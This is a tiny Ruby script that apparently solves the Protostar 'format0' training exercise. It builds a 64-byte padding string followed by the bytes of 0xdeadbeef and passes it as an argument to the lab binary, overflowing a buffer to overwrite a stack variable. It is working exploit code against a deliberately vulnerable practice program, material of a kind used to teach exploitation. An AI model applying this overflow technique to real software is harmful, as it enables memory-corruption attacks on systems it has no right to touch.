#!/usr/bin/ruby

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP";
deadbeef = "\xef\xbe\xad\xde";
#puts padding + deadbeef;

command = <<-END
/opt/protostar/bin/format0 #{padding + deadbeef}
END

puts `#{command}`
